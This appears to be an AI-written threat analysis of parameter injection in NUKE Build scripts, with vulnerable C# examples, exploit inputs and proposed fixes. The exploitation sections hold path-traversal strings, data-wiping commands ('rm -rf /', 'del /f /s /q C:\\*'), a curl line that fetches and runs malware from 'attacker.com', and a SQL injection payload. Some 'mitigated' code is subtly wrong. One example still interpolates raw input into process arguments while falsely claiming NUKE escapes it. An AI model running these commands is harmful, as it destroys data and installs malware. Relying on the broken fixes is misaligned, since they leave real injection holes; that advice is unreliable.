Okay, here's a deep analysis of the "Malicious Parameter Injection (into NUKE's Parameters)" threat, tailored for a development team using NUKE Build:

## Deep Analysis: Malicious Parameter Injection in NUKE Build

### 1. Objective, Scope, and Methodology

**Objective:**

The primary objective of this deep analysis is to thoroughly understand the "Malicious Parameter Injection" threat within the context of a NUKE Build-based project.  This includes identifying specific vulnerable code patterns, providing concrete examples, and recommending actionable mitigation strategies beyond the high-level descriptions in the initial threat model.  The goal is to equip the development team with the knowledge to prevent and detect this vulnerability in their build scripts.

**Scope:**

This analysis focuses exclusively on how user-supplied parameters to a NUKE build script can be exploited.  It does *not* cover:

*   Vulnerabilities within the NUKE framework itself (those are the responsibility of the NUKE maintainers).
*   Vulnerabilities in external tools called by the NUKE script (e.g., vulnerabilities in `dotnet`, `git`, etc.).  While NUKE might *trigger* these, the root cause lies elsewhere.
*   Compromise of the build server itself (e.g., someone gaining SSH access).
*   Supply chain attacks on NUKE dependencies.

The scope is limited to the C# code *within* the `build.csproj` and related files that define the NUKE build process, specifically how this code handles parameters marked with the `[Parameter]` attribute.

**Methodology:**

1.  **Code Pattern Analysis:** Identify common, unsafe ways developers might use parameters within NUKE build scripts.
2.  **Example Vulnerability Creation:** Construct realistic, yet simplified, examples of vulnerable NUKE build scripts.
3.  **Exploitation Demonstration:** Show how these vulnerabilities can be exploited with malicious parameter inputs.
4.  **Mitigation Strategy Refinement:** Provide detailed, code-specific mitigation techniques for each identified vulnerability pattern.
5.  **Tooling Recommendations:** Suggest tools and techniques that can help automate the detection and prevention of these vulnerabilities.

### 2. Deep Analysis of the Threat

**2.1. Vulnerable Code Patterns and Examples**

Let's examine several common scenarios where malicious parameter injection can occur:

**2.1.1. Unsafe File Path Manipulation**

**Vulnerable Code (build.csproj or related file):**

```csharp
[Parameter("Path to the file to delete")]
readonly string FileToDelete;

Target DeleteFile => _ => _
    .Executes(() =>
    {
        File.Delete(FileToDelete); // Directly using the parameter
    });
```

**Exploitation:**

An attacker could provide a value like `../../../etc/passwd` (on Linux) or `..\..\..\Windows\System32\drivers\etc\hosts` (on Windows) for the `FileToDelete` parameter.  This would cause the build script to delete a critical system file, potentially leading to system instability or denial of service.  Even `../../some-other-project/secrets.json` could be targeted.

**2.1.2. Unsafe Shell Command Execution**

**Vulnerable Code:**

```csharp
[Parameter("Command to execute")]
readonly string CommandToExecute;

Target ExecuteCommand => _ => _
    .Executes(() =>
    {
        // VERY DANGEROUS: Directly executing user-provided command
        // Using Serilog for demonstration, but the vulnerability is in the shell execution
        Serilog.Log.Information($"Executing: {CommandToExecute}");
        var process = Process.Start("cmd.exe", $"/c {CommandToExecute}"); // Or "bash" on Linux
        process.WaitForExit();
    });
```

**Exploitation:**

An attacker could provide a command like `rm -rf /` (on Linux) or `del /f /s /q C:\*` (on Windows) for the `CommandToExecute` parameter.  This would result in catastrophic data loss.  Even less destructive commands, like `curl http://attacker.com/malware.exe -o malware.exe && malware.exe`, could be used to download and execute malware.

**2.1.3. Unsafe Use in String Formatting (Less Common, but Possible)**

**Vulnerable Code:**

```csharp
[Parameter("Message to log")]
readonly string LogMessage;

Target LogSomething => _ => _
    .Executes(() =>
    {
        // Potentially vulnerable if LogMessage contains format specifiers
        Serilog.Log.Information(LogMessage);
    });
```

**Exploitation:**

While less common with structured logging libraries like Serilog, if `LogMessage` contains format specifiers (e.g., `{0}`, `{1}`) and the logging framework doesn't handle them safely, an attacker *might* be able to inject data or cause unexpected behavior.  This is more of a concern with older or custom logging implementations.  It's best practice to avoid direct string interpolation with user input in logging.

**2.1.4. Unsafe Database Operations**

**Vulnerable Code (Conceptual - Requires a database connection):**

```csharp
[Parameter("User ID to delete")]
readonly string UserIdToDelete;

Target DeleteUser => _ => _
    .Executes(() =>
    {
        // Assuming a database connection is established elsewhere
        // VULNERABLE: SQL Injection
        string sql = $"DELETE FROM Users WHERE UserId = '{UserIdToDelete}'";
        ExecuteSql(sql); // Hypothetical function to execute SQL
    });
```

**Exploitation:**

An attacker could provide a value like `' OR 1=1 --` for `UserIdToDelete`. This would result in the following SQL query: `DELETE FROM Users WHERE UserId = '' OR 1=1 --'`.  The `OR 1=1` condition makes the `WHERE` clause always true, deleting *all* users. The `--` comments out the rest of the query.

**2.2. Mitigation Strategies (Detailed)**

For each of the above patterns, here are specific mitigation strategies:

**2.2.1. Safe File Path Manipulation**

*   **Absolute Paths and Validation:**  If possible, require absolute paths and validate that they fall within an expected directory.
*   **Path.Combine and Normalization:** Use `Path.Combine` to construct paths safely and then normalize the result using `Path.GetFullPath`.  This helps prevent directory traversal attacks.
*   **Whitelisting:** If the files to be manipulated are known in advance, use a whitelist of allowed paths.
*   **Avoid User-Controlled Paths:** If at all possible, avoid letting the user directly specify file paths.  Instead, use predefined paths or derive them from other, more controlled parameters.

**Mitigated Code:**

```csharp
[Parameter("Filename to delete (within the build output directory)")]
readonly string FileToDelete;

Target DeleteFile => _ => _
    .Executes(() =>
    {
        // Construct the full path safely
        string fullPath = Path.GetFullPath(Path.Combine(RootDirectory / "output", FileToDelete));

        // Validate that the path is within the expected directory
        if (!fullPath.StartsWith(RootDirectory / "output"))
        {
            throw new ArgumentException("Invalid file path.");
        }

        File.Delete(fullPath);
    });
```

**2.2.2. Safe Shell Command Execution**

*   **Avoid Shell Commands:** The best mitigation is to avoid shell commands entirely.  Use built-in NUKE tasks or .NET libraries whenever possible.
*   **Parameterized Commands:** If shell commands are unavoidable, use parameterized commands (also known as prepared statements) to prevent injection.  *Never* directly concatenate user input into a shell command string.
*   **Escape User Input (Less Reliable):**  If parameterization is not possible (rare), you *must* properly escape user input for the specific shell being used.  This is error-prone and should be avoided if at all possible.  Different shells have different escaping rules.

**Mitigated Code (using Nuke.Common.Tools):**

```csharp
[Parameter("Argument for a tool")]
readonly string ToolArgument;

Target ExecuteTool => _ => _
    .Executes(() =>
    {
        // Example using DotNetTasks (replace with your actual tool)
        DotNetTasks.DotNet($"tool run mytool --argument {ToolArgument}"); //NUKE handles escaping
    });
```
**Mitigated Code (using ProcessStartInfo - More Control):**

```csharp
    [Parameter("Argument for a tool")]
    readonly string ToolArgument;

    Target ExecuteTool => _ => _
        .Executes(() =>
        {
            var processInfo = new ProcessStartInfo
            {
                FileName = "mytool", // The executable
                Arguments = $"--argument {ToolArgument}", // Arguments, NUKE will handle basic escaping
                UseShellExecute = false, // Important for security
                RedirectStandardOutput = true,
                RedirectStandardError = true
            };

            var process = Process.Start(processInfo);
            process.WaitForExit();

            // Handle output and errors
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
        });
```

**2.2.3. Safe Logging**

*   **Structured Logging:** Use structured logging libraries like Serilog or Microsoft.Extensions.Logging.  These libraries typically handle format specifiers safely.
*   **Avoid Direct Interpolation:** Instead of `Log.Information(LogMessage)`, use `Log.Information("Message: {Message}", LogMessage)`. This treats `LogMessage` as a data value, not a format string.

**Mitigated Code:**

```csharp
[Parameter("Message to log")]
readonly string LogMessage;

Target LogSomething => _ => _
    .Executes(() =>
    {
        Serilog.Log.Information("User-provided message: {Message}", LogMessage);
    });
```

**2.2.4. Safe Database Operations**

*   **Parameterized Queries (Prepared Statements):**  *Always* use parameterized queries or an ORM (Object-Relational Mapper) to interact with databases.  This is the *only* reliable way to prevent SQL injection.
*   **ORM:**  ORMs like Entity Framework Core provide a higher-level abstraction that typically handles parameterization automatically.

**Mitigated Code (Conceptual - Using Parameterized Query):**

```csharp
[Parameter("User ID to delete")]
readonly string UserIdToDelete;

Target DeleteUser => _ => _
    .Executes(() =>
    {
        // Assuming a database connection is established elsewhere
        // SAFE: Parameterized Query
        string sql = "DELETE FROM Users WHERE UserId = @UserId";
        ExecuteSql(sql, new { UserId = UserIdToDelete }); // Hypothetical function
    });
```

**2.3. Tooling Recommendations**

*   **Static Analysis:** Use static analysis tools like:
    *   **Roslyn Analyzers:**  .NET's built-in analyzers can detect some unsafe code patterns.
    *   **Security Code Scan:** A Roslyn analyzer specifically focused on security vulnerabilities.
    *   **SonarQube/SonarCloud:**  A comprehensive code quality and security platform.
*   **Dynamic Analysis (Fuzzing):** Consider using fuzzing techniques to test your build script with a wide range of unexpected inputs. This can help uncover vulnerabilities that static analysis might miss.
*   **Code Reviews:**  Mandatory code reviews, with a specific focus on how parameters are used, are crucial.
*   **NUKE Global Tools:** Explore if any NUKE global tools or extensions exist that can help with security analysis or parameter validation.
* **CI/CD Integration:** Integrate static analysis tools into your CI/CD pipeline to automatically scan for vulnerabilities on every build.

### 3. Conclusion

Malicious parameter injection is a serious threat to NUKE build scripts. By understanding the vulnerable code patterns, implementing robust mitigation strategies, and utilizing appropriate tooling, development teams can significantly reduce the risk of this vulnerability.  The key takeaways are:

*   **Never trust user input:** Treat all parameters as potentially malicious.
*   **Validate and sanitize:** Rigorously validate and sanitize all parameters before using them.
*   **Avoid shell commands if possible:**  Use built-in NUKE tasks or .NET libraries instead.
*   **Use parameterized queries for databases:**  This is essential for preventing SQL injection.
*   **Automate security checks:** Integrate static analysis and code reviews into your development workflow.

This deep analysis provides a strong foundation for securing your NUKE build scripts against malicious parameter injection. Remember to continuously review and update your security practices as new threats and techniques emerge.
